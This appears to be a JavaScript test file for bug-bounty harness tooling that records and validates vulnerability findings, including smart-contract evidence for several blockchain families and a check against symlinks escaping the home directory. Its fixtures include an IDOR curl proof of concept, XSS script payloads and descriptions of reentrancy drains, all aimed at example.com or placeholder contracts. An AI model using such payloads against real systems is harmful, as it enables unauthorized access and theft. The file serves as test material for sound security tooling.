      { agent: "a2", surface_id: "surface-b" },
    ]);
    writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "A1 complete with an old dead end.",
      chain_notes: ["Old endpoint may chain into surface-b."],
      content: "# ignored markdown details",
      dead_ends: ["/old"],
      lead_surface_ids: ["surface-b"],
    });
    writeFileAtomic(path.join(dir, "handoff-w1-a2.md"), "# markdown only\n");

    const result = JSON.parse(readWaveHandoffs({ target_domain: domain }));
    assert.deepEqual(result.wave_numbers, [1]);
    assert.deepEqual(result.handoffs, [{
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_type: null,
      surface_status: "complete",
      provenance: "legacy_unverified",
      summary: "A1 complete with an old dead end.",
      chain_notes: ["Old endpoint may chain into surface-b."],
      blocked_harness_runs: [],
      bypass_attempts: [],
      dead_ends: ["/old"],
      waf_blocked_endpoints: [],
      lead_surface_ids: ["surface-b"],
    }]);
    assert.deepEqual(result.missing_handoffs, [{ wave: "w1", agent: "a2", surface_id: "surface-b" }]);
    assert.deepEqual(result.invalid_handoffs, []);
    assert.deepEqual(result.unexpected_handoffs, []);
  });
});

test("bounty_merge_wave_handoffs hard-fails when the assignment file is missing", () => {
  withTempHome(() => {
    assert.throws(
      () => mergeWaveHandoffs({ target_domain: "example.com", wave_number: 4 }),
      /Missing assignment file/,
    );
  });
});

test("bounty_record_finding appends findings.jsonl and bounty_read_findings preserves insertion order", () => {
  withTempHome(() => {
    const domain = "example.com";
    const first = seedFinding(domain);
    const second = seedFinding(domain, {
      title: "Stored XSS in comments",
      severity: "medium",
      endpoint: "/comments",
      description: "Unsanitized comment body executes in admin view.",
      proof_of_concept: "<script>alert(1)</script>",
      response_evidence: "<script>alert(1)</script>",
      impact: "Admin session compromise.",
      wave: "w2",
      agent: "a2",
    });

    assert.equal(first.finding_id, "F-1");
    assert.equal(second.finding_id, "F-2");

    const findingsPath = findingsJsonlPath(domain);
    const jsonlLines = fs.readFileSync(findingsPath, "utf8").trim().split("\n");
    assert.equal(jsonlLines.length, 2);
    assert.equal(JSON.parse(jsonlLines[0]).id, "F-1");
    assert.equal(JSON.parse(jsonlLines[1]).id, "F-2");

    const readResult = JSON.parse(readFindings({ target_domain: domain }));
    assert.match(readResult.findings[0].dedupe_key, /^[a-f0-9]{24}$/);
    assert.match(readResult.findings[1].dedupe_key, /^[a-f0-9]{24}$/);
    const readResultWithoutDedupeKeys = {
      ...readResult,
      findings: readResult.findings.map(({ dedupe_key, ...finding }) => finding),
    };
    assert.deepEqual(readResultWithoutDedupeKeys, {
      version: 1,
      target_domain: domain,
      findings: [
        {
          id: "F-1",
          target_domain: domain,
          title: "IDOR on account export",
          severity: "high",
          cwe: "CWE-639",
          endpoint: "/api/export",
          description: "Authenticated user can export another account's data by changing account_id.",
          proof_of_concept: "curl https://example.com/api/export?account_id=2",
          response_evidence: "{\"account_id\":2}",
          impact: "Cross-account PII disclosure.",
          validated: true,
          wave: "w1",
          agent: "a1",
          surface_id: "surface-a",
          surface_type: "web",
          sc_evidence: null,
          auth_profile: null,
        },
        {
          id: "F-2",
          target_domain: domain,
          title: "Stored XSS in comments",
          severity: "medium",
          cwe: "CWE-639",
          endpoint: "/comments",
          description: "Unsanitized comment body executes in admin view.",
          proof_of_concept: "<script>alert(1)</script>",
          response_evidence: "<script>alert(1)</script>",
          impact: "Admin session compromise.",
          validated: true,
          wave: "w2",
          agent: "a2",
          surface_id: "surface-a",
          surface_type: "web",
          sc_evidence: null,
          auth_profile: null,
        },
      ],
    });
  });
});

test("bounty_record_finding still writes readable findings.md", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedFinding(domain);

    const markdown = fs.readFileSync(findingsMarkdownPath(domain), "utf8");
    assert.match(markdown, /## FINDING 1 \(HIGH\): IDOR on account export/);
    assert.match(markdown, /\*\*ID:\*\* F-1/);
    assert.match(markdown, /curl https:\/\/example.com\/api\/export\?account_id=2/);
  });
});

test("bounty_record_finding stamps surface_type from the assignment and treats SC findings as requiring sc_evidence", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [
      { id: "surface-web", hosts: [`https://${domain}`], surface_type: "api" },
      { id: "surface-sc", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "evm" },
    ]);
    seedAssignments(domain, 1, [
      { agent: "a1", surface_id: "surface-web" },
      { agent: "a2", surface_id: "surface-sc" },
    ]);

    const webFinding = JSON.parse(recordFinding({
      target_domain: domain,
      title: "IDOR on account export",
      severity: "high",
      cwe: "CWE-639",
      endpoint: "/api/export",
      description: "Authenticated user can export another account's data by changing account_id.",
      proof_of_concept: "curl https://example.com/api/export?account_id=2",
      response_evidence: "{\"account_id\":2}",
      impact: "Cross-account PII disclosure.",
      validated: true,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-web",
    }));
    assert.equal(webFinding.recorded, true);
    const webRow = readFindings({ target_domain: domain });
    const webRowFindings = JSON.parse(webRow).findings;
    assert.equal(webRowFindings[0].surface_type, "web");
    assert.equal(webRowFindings[0].sc_evidence, null);

    // SC finding without sc_evidence must be rejected
    assert.throws(() => recordFinding({
      target_domain: domain,
      title: "Reentrancy in Vault.borrow",
      severity: "high",
      cwe: "CWE-841",
      endpoint: "0x" + "11".repeat(20) + ":borrow(uint256)",
      description: "Reentrancy via callback before balance update.",
      proof_of_concept: "See harness test",
      response_evidence: "Drained 1000 ETH",
      impact: "Permanent loss of all vault funds.",
      validated: true,
      wave: "w1",
      agent: "a2",
      surface_id: "surface-sc",
    }), /smart-contract findings must include sc_evidence/);

    // Web finding with sc_evidence must be rejected
    assert.throws(() => recordFinding({
      target_domain: domain,
      title: "XSS",
      severity: "low",
      cwe: "CWE-79",
      endpoint: "/admin",
      description: "Reflected XSS",
      proof_of_concept: "?q=<script>",
      response_evidence: "<script>",
      impact: "Session compromise",
      validated: true,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-web",
      sc_evidence: {
        chain_id: 1,
        contract_address: "0x" + "11".repeat(20),
        harness_path: os.homedir(),
        match_test: "test_x",
      },
    }), /sc_evidence is only allowed on smart_contract findings/);

    // SC finding with valid sc_evidence is accepted and persisted
    const scResult = JSON.parse(recordFinding({
      target_domain: domain,
      title: "Reentrancy in Vault.borrow",
      severity: "high",
      cwe: "CWE-841",
      endpoint: "0x" + "11".repeat(20) + ":borrow(uint256)",
      description: "Reentrancy via callback before balance update.",
      proof_of_concept: "See harness test",
      response_evidence: "Drained 1000 ETH",
      impact: "Permanent loss of all vault funds.",
      validated: true,
      wave: "w1",
      agent: "a2",
      surface_id: "surface-sc",
      sc_evidence: {
        chain_id: 1,
        contract_address: "0x" + "AB".repeat(20),
        harness_path: os.homedir(),
        match_test: "test_borrow_reentrancy",
        fork_block: 19_000_000,
        function_signature: "borrow(uint256)",
      },
    }));
    assert.equal(scResult.recorded, true);
    const scRows = JSON.parse(readFindings({ target_domain: domain })).findings;
    const scFinding = scRows.find((f) => f.id === scResult.finding_id);
    assert.equal(scFinding.surface_type, "smart_contract");
    assert.equal(scFinding.sc_evidence.chain_id, 1);
    // contract_address normalized to lowercase
    assert.equal(scFinding.sc_evidence.contract_address, "0x" + "ab".repeat(20));
    assert.equal(scFinding.sc_evidence.fork_block, 19_000_000);
  });
});

test("normalizeFindingRecord forbids sc_evidence on legacy null-surface rows (back-compat smuggling)", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  // A row pre-Phase-3a has surface_type=null. Pre-fix, sc_evidence was only
  // forbidden on surface_type="web", so a malicious or buggy row could carry
  // SC replay data while being routed as web by verifiers. Post-fix, sc_evidence
  // is allowed only when surface_type === "smart_contract".
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "Looks web",
    severity: "low",
    cwe: null,
    endpoint: "/x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: null,
    sc_evidence: {
      chain_id: 1,
      contract_address: "0x" + "11".repeat(20),
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /sc_evidence is only allowed on smart_contract findings/);
});

test("bounty_record_finding rejects sc_evidence with a symlink that escapes $HOME (realpath check)", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [
      { id: "surface-sc", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "evm" },
    ]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-sc" }]);
    // Plant $HOME/escape -> /tmp/outside-home (a directory outside the
    // ephemeral $HOME). Lexical containment passes; realpath escapes.
    const home = os.homedir();
    const tmpRoot = path.join(os.tmpdir(), "bob-symlink-bypass-" + Math.random().toString(36).slice(2));
    fs.mkdirSync(tmpRoot, { recursive: true });
    const linkPath = path.join(home, "escape-link");
    try { fs.unlinkSync(linkPath); } catch {}
    fs.symlinkSync(tmpRoot, linkPath, "dir");
    try {
      assert.throws(() => recordFinding({
        target_domain: domain,
        title: "Reentrancy",
        severity: "high",
        endpoint: "0x" + "11".repeat(20) + ":borrow",
        description: "x",
        proof_of_concept: "y",
        validated: true,
        wave: "w1",
        agent: "a1",
        surface_id: "surface-sc",
        sc_evidence: {
          chain_id: 1,
          contract_address: "0x" + "11".repeat(20),
          harness_path: linkPath,
          match_test: "test_x",
        },
      }), /must live under the user home directory/);
    } finally {
      try { fs.unlinkSync(linkPath); } catch {}
      try { fs.rmdirSync(tmpRoot); } catch {}
    }
  });
});

test("bounty_record_finding rejects sc_evidence with harness_path outside the user home", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [
      { id: "surface-sc", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "evm" },
    ]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-sc" }]);
    assert.throws(() => recordFinding({
      target_domain: domain,
      title: "Reentrancy",
      severity: "high",
      endpoint: "0x" + "11".repeat(20) + ":borrow",
      description: "x",
      proof_of_concept: "y",
      validated: true,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-sc",
      sc_evidence: {
        chain_id: 1,
        contract_address: "0x" + "11".repeat(20),
        harness_path: "/etc",
        match_test: "test_x",
      },
    }), /harness_path must live under the user home directory/);
  });
});

test("bounty_record_finding accepts SVM sc_evidence with chain_family='svm' and base58 program id", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [
      { id: "surface-svm", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "svm" },
    ]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-svm" }]);
    // System Program 11111111111111111111111111111111 is the canonical short
    // base58 32-byte all-zero pubkey — useful as a deterministic fixture.
    const programId = "11111111111111111111111111111111";
    const result = JSON.parse(recordFinding({
      target_domain: domain,
      title: "Missing signer check on Vault.withdraw",
      severity: "high",
      cwe: "CWE-862",
      endpoint: programId + ":withdraw",
      description: "Withdraw instruction does not require the vault authority signer.",
      proof_of_concept: "anchor test --grep withdraw_unauthorized",
      response_evidence: "Drained 1000 SOL via missing signer check",
      impact: "Permanent loss of all vault deposits.",
      validated: true,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-svm",
      sc_evidence: {
        chain_family: "svm",
        chain_id: "mainnet-beta",
        contract_address: programId,
        harness_path: os.homedir(),
        match_test: "withdraw_unauthorized",
        fork_block: 250_000_000,
        function_signature: "Withdraw{amount: u64}",
      },
    }));
    assert.equal(result.recorded, true);
    const rows = JSON.parse(readFindings({ target_domain: domain })).findings;
    const svmFinding = rows.find((f) => f.id === result.finding_id);
    assert.equal(svmFinding.surface_type, "smart_contract");
    assert.equal(svmFinding.sc_evidence.chain_family, "svm");
    assert.equal(svmFinding.sc_evidence.chain_id, "mainnet-beta");
    // base58 is case-sensitive — verbatim preservation
    assert.equal(svmFinding.sc_evidence.contract_address, programId);
    assert.equal(svmFinding.sc_evidence.fork_block, 250_000_000);
  });
});

test("sc_evidence rejects chain_family='svm' with EVM-style 0x address", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "svm",
      chain_id: "mainnet-beta",
      contract_address: "0x" + "11".repeat(20),
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /contract_address must be a base58 32-44 char Solana program id/);
});

test("sc_evidence rejects chain_family='evm' with base58 svm pubkey", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "evm",
      chain_id: 1,
      contract_address: "11111111111111111111111111111111",
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /contract_address must be a 0x-prefixed 40-hex EVM address/);
});

test("sc_evidence rejects chain_family='svm' with unknown cluster", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "svm",
      chain_id: "rogue-cluster",
      contract_address: "11111111111111111111111111111111",
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /chain_id must be one of: mainnet-beta, devnet, testnet/);
});

test("sc_evidence rejects chain_family='svm' with base58 alphabet violation (0/O/I/l)", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  // "0" is not in the base58 alphabet — a pubkey that contains it must be rejected.
  // System Program prefix with one '0' substituted in.
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "svm",
      chain_id: "mainnet-beta",
      contract_address: "0111111111111111111111111111111", // contains '0' (invalid in base58)
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /contract_address must be a base58 32-44 char Solana program id/);
});

test("sc_evidence rejects unknown chain_family value", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "tron",
      chain_id: 1,
      contract_address: "0x" + "11".repeat(20),
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /chain_family must be one of: evm, svm, aptos, sui, substrate, cosmwasm/);
});

test("sc_evidence chain_family defaults to 'evm' when omitted (back-compat)", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  // A pre-Phase-4 row had no chain_family field at all. The normalizer must
  // default to 'evm' so existing findings.jsonl rows keep validating.
  const finding = normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "Reentrancy",
    severity: "high",
    cwe: "CWE-841",
    endpoint: "0x" + "11".repeat(20) + ":borrow",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      // no chain_family
      chain_id: 1,
      contract_address: "0x" + "AB".repeat(20),
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  });
  assert.equal(finding.sc_evidence.chain_family, "evm");
  assert.equal(finding.sc_evidence.chain_id, 1);
  assert.equal(finding.sc_evidence.contract_address, "0x" + "ab".repeat(20));
});

test("foundry runner translates Success/Failure to Pass/Fail and caps tests[] at 100", () => {
  const { summarizeForgeJson } = require("../mcp/lib/foundry-runner.js");
  // Two suites, mix of statuses including unknown.
  const result = summarizeForgeJson({
    "Vault.t.sol:VaultTest": {
      test_results: {
        "test_borrow_reentrancy": { status: "Success", reason: null },
        "test_repay_revert": { status: "Failure", reason: "expected revert" },
        "test_skip_branch": { status: "Skipped" },
      },
    },
  });
  assert.equal(result.total, 3);
  assert.equal(result.passed, 1);
  assert.equal(result.failed, 2);
  assert.equal(result.tests[0].status, "Pass");
  assert.equal(result.tests[0].status_raw, "Success");
  assert.equal(result.tests[1].status, "Fail");
  assert.equal(result.tests[1].status_raw, "Failure");
  assert.equal(result.tests[2].status, "Skipped");
  assert.equal(result.truncated, false);

  // Synthesize 150 tests in a single suite to assert cap + truncated flag.
  const big = { "Big.t.sol:BigTest": { test_results: {} } };
  for (let i = 0; i < 150; i += 1) {
    big["Big.t.sol:BigTest"].test_results[`test_${i}`] = { status: "Success" };
  }
  const capped = summarizeForgeJson(big);
  assert.equal(capped.total, 150);
  assert.equal(capped.passed, 150);
  assert.equal(capped.tests.length, 100, "tests[] must be capped at 100");
  assert.equal(capped.truncated, true);
});

test("sc_evidence svm pubkey rejects strings that pass alphabet but decode to <32 bytes", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  // 32 chars of valid base58 alphabet that are NOT leading-1s decode to ~23 bytes
  // (32 * log2(58) / 8 ≈ 23.4). The alphabet+length regex passes; the decode-length
  // check must catch it. Use a deterministic 32-char string with no leading "1".
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "svm",
      chain_id: "mainnet-beta",
      contract_address: "AaBbCcDdEeFfGgHhJjKkMmNnPpQqRrSs", // 32 chars no leading 1
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /must base58-decode to exactly 32 bytes/);
});

test("bounty_record_finding accepts Aptos sc_evidence with chain_family='aptos' and 0x64-hex module address", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [
      { id: "surface-aptos", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "aptos" },
    ]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-aptos" }]);
    const moduleAddr = "0x" + "ab".repeat(32); // 64 hex chars
    const result = JSON.parse(recordFinding({
      target_domain: domain,
      title: "Capability leak in CoinStore::deposit",
      severity: "high",
      cwe: "CWE-862",
      endpoint: moduleAddr + "::CoinStore::deposit",
      description: "Capability acquire happens outside has_capability gate.",
      proof_of_concept: "aptos move test --filter test_capability_leak",
      response_evidence: "Drained 1000 APT via missing capability check",
      impact: "Permanent loss of all CoinStore deposits.",
      validated: true,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-aptos",
      sc_evidence: {
        chain_family: "aptos",
        chain_id: "mainnet",
        contract_address: moduleAddr,
        harness_path: os.homedir(),
        match_test: "test_capability_leak",
        fork_block: 1_500_000,
        function_signature: "CoinStore::deposit",
      },
    }));
    assert.equal(result.recorded, true);
    const rows = JSON.parse(readFindings({ target_domain: domain })).findings;
    const aptosFinding = rows.find((f) => f.id === result.finding_id);
    assert.equal(aptosFinding.surface_type, "smart_contract");
    assert.equal(aptosFinding.sc_evidence.chain_family, "aptos");
    assert.equal(aptosFinding.sc_evidence.chain_id, "mainnet");
    assert.equal(aptosFinding.sc_evidence.contract_address, moduleAddr);
    assert.equal(aptosFinding.sc_evidence.fork_block, 1_500_000);
  });
});

test("bounty_record_finding accepts Sui sc_evidence with chain_family='sui' and 0x64-hex package id", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [
      { id: "surface-sui", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "sui" },
    ]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-sui" }]);
    const packageId = "0x" + "cd".repeat(32);
    const result = JSON.parse(recordFinding({
      target_domain: domain,
      title: "Object ownership violation in Vault::withdraw",
      severity: "critical",
      cwe: "CWE-863",
      endpoint: packageId + "::vault::withdraw",
      description: "Public entry function transfers Coin without verifying owner.",
      proof_of_concept: "sui move test --filter test_object_ownership",
      response_evidence: "Drained 1M SUI via wrong-owner withdrawal",
      impact: "Permanent loss of all vault deposits.",
      validated: true,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-sui",
      sc_evidence: {
        chain_family: "sui",
        chain_id: "mainnet",
        contract_address: packageId,
        harness_path: os.homedir(),
        match_test: "test_object_ownership",
        fork_block: 67_000_000,
        function_signature: "vault::withdraw",
      },
    }));
    assert.equal(result.recorded, true);
    const rows = JSON.parse(readFindings({ target_domain: domain })).findings;
    const suiFinding = rows.find((f) => f.id === result.finding_id);
    assert.equal(suiFinding.surface_type, "smart_contract");
    assert.equal(suiFinding.sc_evidence.chain_family, "sui");
    assert.equal(suiFinding.sc_evidence.chain_id, "mainnet");
    assert.equal(suiFinding.sc_evidence.contract_address, packageId);
    assert.equal(suiFinding.sc_evidence.fork_block, 67_000_000);
  });
});

test("sc_evidence normalizes Move shorthand address (0x1) to canonical 64-hex form", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  // Aptos prints framework addresses as shorthand: "0x1" is the std lib,
  // canonically "0x000...001". The normalizer must left-pad so two findings
  // recorded against "0x1" and "0x0000...0001" share the same dedupe key.
  const finding = normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "aptos",
      chain_id: "mainnet",
      contract_address: "0x1",
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  });
  // 0x + 63 zeros + "1"
  assert.equal(finding.sc_evidence.contract_address, "0x" + "0".repeat(63) + "1");
});

test("sc_evidence rejects chain_family='aptos' with unknown network", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "aptos",
      chain_id: "rogue-net",
      contract_address: "0x" + "ab".repeat(32),
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /chain_id must be one of: mainnet, testnet, devnet/);
});

test("sc_evidence rejects chain_family='sui' with unknown network", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "sui",
      chain_id: "rogue-net",
      contract_address: "0x" + "ab".repeat(32),
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /chain_id must be one of: mainnet, testnet, devnet, localnet/);
});

test("sc_evidence rejects Move family with non-hex address", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  // Aptos hunter accidentally pasted a base58 svm pubkey. Move normalizer
  // must reject because address fails the 0x+hex regex.
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "aptos",
      chain_id: "mainnet",
      contract_address: "11111111111111111111111111111111",
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /contract_address must be a 0x-prefixed hex address \(1-64 hex chars\) when chain_family='aptos'/);
});

test("sc_evidence rejects Move family with empty 0x address (no hex chars)", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  // 0x with zero hex chars is technically not a Move address (Aptos shorthand
  // requires at least one hex char). Regex {1,64} prevents the empty case.
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "sui",
      chain_id: "mainnet",
      contract_address: "0x",
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /contract_address must be a 0x-prefixed hex address \(1-64 hex chars\) when chain_family='sui'/);
});

test("sc_evidence rejects chain_family='aptos' with integer chain_id (must be string network)", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  // Aptos has an integer chain_id (1 = mainnet) used for replay protection,
  // but our schema keys RPC pools by network NAME. Reject integers to avoid
  // ambiguity with EVM chain_id integer convention.
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "aptos",
      chain_id: 1,
      contract_address: "0x" + "ab".repeat(32),
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /chain_id must be one of: mainnet, testnet, devnet/);
});

test("bounty_record_finding accepts Substrate sc_evidence with chain_family='substrate' and SS58 address", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [
      { id: "surface-substrate", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "substrate" },
    ]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-substrate" }]);
    // Alice's well-known generic-substrate SS58 address (prefix 42).
    const alice = "5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY";
    const result = JSON.parse(recordFinding({
      target_domain: domain,
      title: "Reentrancy via cross-contract call in ink! marketplace",
      severity: "high",
      cwe: "CWE-841",
      endpoint: alice + "::buy",
      description: "Cross-contract call to buyer-supplied receiver enables reentrancy.",
      proof_of_concept: "cargo test --features e2e-tests test_reentrancy",
      response_evidence: "Drained 100 DOT after recursive buy()",
      impact: "Drain of marketplace escrow.",
      validated: true,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-substrate",
      sc_evidence: {
        chain_family: "substrate",
        chain_id: "polkadot",
        contract_address: alice,
        harness_path: os.homedir(),
        match_test: "test_reentrancy",
        fork_block: 19_000_000,
        function_signature: "marketplace::buy",
      },
    }));
    assert.equal(result.recorded, true);
    const rows = JSON.parse(readFindings({ target_domain: domain })).findings;
    const subFinding = rows.find((f) => f.id === result.finding_id);
    assert.equal(subFinding.surface_type, "smart_contract");
    assert.equal(subFinding.sc_evidence.chain_family, "substrate");
    assert.equal(subFinding.sc_evidence.chain_id, "polkadot");
    assert.equal(subFinding.sc_evidence.contract_address, alice); // case preserved
    assert.equal(subFinding.sc_evidence.fork_block, 19_000_000);
  });
});

test("bounty_record_finding accepts CosmWasm sc_evidence with chain_family='cosmwasm' and bech32 address", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [
      { id: "surface-cosmwasm", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "cosmwasm" },
    ]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-cosmwasm" }]);
    // Generated bech32 with HRP=osmo and 32-byte content; verifies the polymod
    // checksum so this is a valid bech32 string. Real osmosis governance and
    // CW contract addresses share this shape.
    const osmoAddr = "osmo1qypqxpq9qcrsszg2pvxq6rs0zqg3yyc5z5tpwxqergd3c8g7rusq4z5ese";
    const result = JSON.parse(recordFinding({
      target_domain: domain,
      title: "Sub-message reply allows balance overwrite",
      severity: "critical",
      cwe: "CWE-841",
      endpoint: osmoAddr + "/execute",
      description: "Reply handler trusts attacker-supplied result without re-checking caller.",
      proof_of_concept: "cargo test test_reply_overwrite",
      response_evidence: "User balance set to attacker_value",
      impact: "Drain via crafted sub-message reply.",
      validated: true,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-cosmwasm",
      sc_evidence: {
        chain_family: "cosmwasm",
        chain_id: "osmosis",
        contract_address: osmoAddr,
        harness_path: os.homedir(),
        match_test: "test_reply_overwrite",
        fork_block: 14_500_000,
        function_signature: "execute::Withdraw",
      },
    }));
    assert.equal(result.recorded, true);
    const rows = JSON.parse(readFindings({ target_domain: domain })).findings;
    const cwFinding = rows.find((f) => f.id === result.finding_id);
    assert.equal(cwFinding.surface_type, "smart_contract");
    assert.equal(cwFinding.sc_evidence.chain_family, "cosmwasm");
    assert.equal(cwFinding.sc_evidence.chain_id, "osmosis");
